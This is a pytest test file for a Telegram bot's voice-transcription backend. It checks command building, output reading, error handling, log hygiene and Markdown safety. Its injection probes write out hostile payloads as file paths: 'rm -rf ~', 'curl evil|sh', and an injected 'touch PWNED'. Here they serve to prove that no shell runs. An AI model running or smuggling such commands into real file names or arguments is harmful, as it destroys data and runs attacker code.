"""P10 T2 — the pluggable voice-transcription backend (claude_tg.voice).

Covers the unit-level contract WITHOUT a real transcriber: the template→argv builder
(injection-safety), stdout vs ``{out}.txt`` reading, graceful-off, and the clean-error
mapping. The bot handler (SB1 / download / echo / turn-fire / temp cleanup) is in
test_bot_streaming.py. The transcriber subprocess is faked (a tiny script that emits a known
transcript, or a monkeypatched ``_run``) — no live STT, no network.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

from claude_tg import voice
from claude_tg.voice import (
    TranscriptionError,
    TranscriptionUnavailable,
    build_transcribe_argv,
    template_uses_out,
    transcribe,
)

# The real subprocess boundary — captured so each monkeypatching test can restore it (the
# suite runs in one process; a leaked fake would corrupt the real-subprocess tests below).
_orig_run = voice._run


# ---------------------------------------------------------------------------
# build_transcribe_argv — the load-bearing injection-safety boundary
# ---------------------------------------------------------------------------


def test_build_argv_substitutes_audio_and_out_as_single_tokens():
    argv = build_transcribe_argv(
        "whisper-cli -m model.bin -f {audio} -otxt -of {out}",
        audio_path="/tmp/x/audio.ogg",
        out_base="/tmp/x/transcript",
    )
    assert argv == [
        "whisper-cli", "-m", "model.bin", "-f", "/tmp/x/audio.ogg",
        "-otxt", "-of", "/tmp/x/transcript",
    ]


def test_build_argv_audio_path_with_spaces_stays_one_token():
    # The path is substituted AFTER shlex.split, so spaces in the (bot-controlled) path do
    # NOT re-split it into extra argv tokens.
    argv = build_transcribe_argv(
        "stt --file {audio}",
        audio_path="/tmp/a dir/audio file.ogg",
        out_base="/tmp/o",
    )
    assert argv == ["stt", "--file", "/tmp/a dir/audio file.ogg"]


def test_build_argv_metachars_in_path_are_inert_no_shell():
    # INJECTION PROBE: even a path packed with shell metacharacters becomes a SINGLE literal
    # argv token — there is no shell to interpret it. (The bot never produces such a path; this
    # pins that the substitution itself can't be abused if one ever slipped through.)
    nasty = "/tmp/x; rm -rf ~ && curl evil|sh `whoami`.ogg"
    argv = build_transcribe_argv("stt -f {audio}", audio_path=nasty, out_base="/o")
    assert argv == ["stt", "-f", nasty]
    # The metacharacters live ENTIRELY inside one token — never split into separate args.
    assert argv[-1] == nasty


def test_build_argv_honors_operator_quoting_in_template():
    # The operator's OWN quoting in the template is honored by shlex (a quoted flag value with
    # a space stays one token); placeholders still substitute as whole tokens.
    argv = build_transcribe_argv('stt --opt "a b" -f {audio}', audio_path="/p.ogg", out_base="/o")
    assert argv == ["stt", "--opt", "a b", "-f", "/p.ogg"]


def test_build_argv_empty_template_raises():
    with pytest.raises(TranscriptionError):
        build_transcribe_argv("   ", audio_path="/a", out_base="/o")


def test_build_argv_unbalanced_quotes_raises_clean():
    with pytest.raises(TranscriptionError):
        build_transcribe_argv('stt -f "unterminated {audio}', audio_path="/a", out_base="/o")


def test_template_uses_out():
    assert template_uses_out("stt -of {out}") is True
    assert template_uses_out("stt -f {audio}") is False


# ---------------------------------------------------------------------------
# transcribe — graceful-off + reading stdout vs {out}.txt + errors
# ---------------------------------------------------------------------------


async def test_transcribe_unset_template_is_graceful_off():
    with pytest.raises(TranscriptionUnavailable):
        await transcribe(template="", audio_path="/a", work_dir="/w", timeout=5)
    with pytest.raises(TranscriptionUnavailable):
        await transcribe(template="   ", audio_path="/a", work_dir="/w", timeout=5)


async def test_transcribe_reads_stdout_when_no_out_placeholder(tmp_path):
    # A fake transcriber that prints a known transcript to stdout (no {out}).
    async def fake_run(argv, *, timeout):
        return 0, b"hello from stdout\n", b""

    voice._run = fake_run  # monkeypatch the subprocess boundary
    try:
        text = await transcribe(
            template="stt -f {audio}", audio_path=str(tmp_path / "a.ogg"),
            work_dir=str(tmp_path), timeout=5,
        )
    finally:
        voice._run = _orig_run
    assert text == "hello from stdout"


async def test_transcribe_reads_out_txt_when_out_placeholder(tmp_path):
    # A fake transcriber that WRITES <out>.txt (the whisper.cpp convention).
    out_base = str(tmp_path / "transcript")

    async def fake_run(argv, *, timeout):
        Path(out_base + ".txt").write_text("whispered words\n", encoding="utf-8")
        return 0, b"progress noise on stdout (ignored)\n", b""

    voice._run = fake_run
    try:
        text = await transcribe(
            template="whisper -f {audio} -of {out} -otxt",
            audio_path=str(tmp_path / "a.ogg"), work_dir=str(tmp_path), timeout=5,
        )
    finally:
        voice._run = _orig_run
    assert text == "whispered words"


async def test_transcribe_nonzero_exit_raises_error_body_free(tmp_path, caplog):
    import logging

    async def fake_run(argv, *, timeout):
        return 3, b"", b"/secret/path/that/must/not/leak.bin: no such model\n"

    voice._run = fake_run
    try:
        with caplog.at_level(logging.DEBUG):
            with pytest.raises(TranscriptionError) as ei:
                await transcribe(
                    template="stt -f {audio}", audio_path=str(tmp_path / "a.ogg"),
                    work_dir=str(tmp_path), timeout=5,
                )
    finally:
        voice._run = _orig_run
    # The raised message is bot-authored (exit code), NOT the raw stderr path.
    assert "/secret/path" not in str(ei.value)
    assert "exit 3" in str(ei.value)
    # Codex B2 (SB3): the raw stderr can carry partial transcripts / paths / secrets — it must
    # NOT be logged either. We log only a body-free summary (exit code), never the stderr body.
    full_log = "\n".join(r.getMessage() for r in caplog.records)
    assert "/secret/path" not in full_log
    assert "no such model" not in full_log
    # But a body-free summary IS logged (so an operator sees the transcriber failed).
    assert "exited 3" in full_log or "exit 3" in full_log


async def test_transcribe_empty_output_raises(tmp_path):
    async def fake_run(argv, *, timeout):
        return 0, b"   \n", b""

    voice._run = fake_run
    try:
        with pytest.raises(TranscriptionError):
            await transcribe(
                template="stt -f {audio}", audio_path=str(tmp_path / "a.ogg"),
                work_dir=str(tmp_path), timeout=5,
            )
    finally:
        voice._run = _orig_run


async def test_transcribe_missing_out_txt_raises(tmp_path):
    # {out} template but the transcriber never wrote the file → clean error.
    async def fake_run(argv, *, timeout):
        return 0, b"", b""

    voice._run = fake_run
    try:
        with pytest.raises(TranscriptionError):
            await transcribe(
                template="whisper -of {out} -otxt -f {audio}",
                audio_path=str(tmp_path / "a.ogg"), work_dir=str(tmp_path), timeout=5,
            )
    finally:
        voice._run = _orig_run


async def test_transcribe_binary_not_found_raises_clean(tmp_path):
    # _run raises FileNotFoundError when the binary is missing → a clean TranscriptionError.
    async def fake_run(argv, *, timeout):
        raise FileNotFoundError(2, "No such file or directory", argv[0])

    voice._run = fake_run
    try:
        with pytest.raises(TranscriptionError) as ei:
            await transcribe(
                template="definitely-not-a-real-binary -f {audio}",
                audio_path=str(tmp_path / "a.ogg"), work_dir=str(tmp_path), timeout=5,
            )
    finally:
        voice._run = _orig_run
    assert "not be found" in str(ei.value) or "not found" in str(ei.value)


# ---------------------------------------------------------------------------
# End-to-end through a REAL subprocess (no mock) — proves _run + no shell.
# ---------------------------------------------------------------------------


async def test_transcribe_real_subprocess_stdout(tmp_path):
    # A tiny real python "transcriber" that emits a known transcript to stdout. Proves the
    # actual create_subprocess_exec path (not the mocked _run) works end to end.
    template = f'{sys.executable} -c "print(\'real transcript out\')"'
    # Note: the template carries no {audio}; that's fine — the script ignores its args.
    text = await transcribe(
        template=template, audio_path=str(tmp_path / "a.ogg"),
        work_dir=str(tmp_path), timeout=30,
    )
    assert text == "real transcript out"


async def test_transcribe_real_subprocess_no_shell_injection(tmp_path):
    # INJECTION PROBE (end to end): a malicious-looking AUDIO PATH is passed as {audio}. With
    # exec (no shell), the path is one literal argv — the embedded `; touch PWNED` is NEVER run.
    sentinel = tmp_path / "PWNED"
    evil_audio = f"{tmp_path}/x; touch {sentinel}; echo .ogg"
    # A python "transcriber" that just echoes a fixed transcript (the {audio} arg is inert).
    template = f'{sys.executable} -c "print(\'safe\')" {{audio}}'
    text = await transcribe(
        template=template, audio_path=evil_audio, work_dir=str(tmp_path), timeout=30,
    )
    assert text == "safe"
    # The injected command never executed — no sentinel file was created.
    assert not sentinel.exists()


async def test_transcribe_real_subprocess_timeout(tmp_path):
    # A real subprocess that sleeps longer than the timeout → killed + clean error.
    template = f'{sys.executable} -c "import time; time.sleep(5)"'
    with pytest.raises(TranscriptionError) as ei:
        await transcribe(
            template=template, audio_path=str(tmp_path / "a.ogg"),
            work_dir=str(tmp_path), timeout=0.3,
        )
    assert "timed out" in str(ei.value)


# ---------------------------------------------------------------------------
# VOICE_SETUP_MESSAGE — Markdown-safety guard (P10 BUG A, same class as the P9
# `/help $*` break). The graceful-off message contains the literal token
# ``TRANSCRIBE_CMD``; the underscore-free copy below is fine, BUT the message must
# never be sent through a Markdown parser with an UNBALANCED special token (a bare
# ``_`` / ``*`` / `` ` ``) or Telegram throws ``BadRequest: can't parse entities``
# and the user gets NOTHING. We pin the message to a payload that is safe to send.
# ---------------------------------------------------------------------------


def _strip_code_spans(text: str) -> str:
    """Remove `` `...` `` code spans — a special char inside a code span is literal."""
    import re

    return re.sub(r"`[^`]*`", "", text)


def test_voice_setup_message_markdown_markers_balanced() -> None:
    """Every Markdown emphasis marker in VOICE_SETUP_MESSAGE (outside code spans) is balanced.

    Regression (BUG A): the message embeds ``TRANSCRIBE_CMD`` — its underscore, if read as
    Markdown, opens an italic span that is never closed → Telegram rejects the whole send and
    the operator gets no reply at all (the common no-transcriber-configured case). The fix
    sends the message as PLAIN TEXT, so this guard simply requires that, whatever the copy is,
    no emphasis marker is left dangling (belt: if anyone re-introduces a Markdown send, the
    payload must still be balanced).
    """
    from claude_tg.bot import VOICE_SETUP_MESSAGE

    body = _strip_code_spans(VOICE_SETUP_MESSAGE)
    for marker in ("_", "*", "`"):
        count = body.count(marker)
        assert count % 2 == 0, (
            f"VOICE_SETUP_MESSAGE has an ODD number of {marker!r} markers ({count}) outside "
            "code spans — a Markdown send would be rejected by Telegram. Send it as plain "
            f"text or code-span the special token (e.g. wrap TRANSCRIBE_CMD in backticks)."
        )
    # The load-bearing token that triggered the bug must be present (we still tell the
    # operator which env var to set) AND must not sit as a bare Markdown italic delimiter.
    assert "TRANSCRIBE_CMD" in VOICE_SETUP_MESSAGE
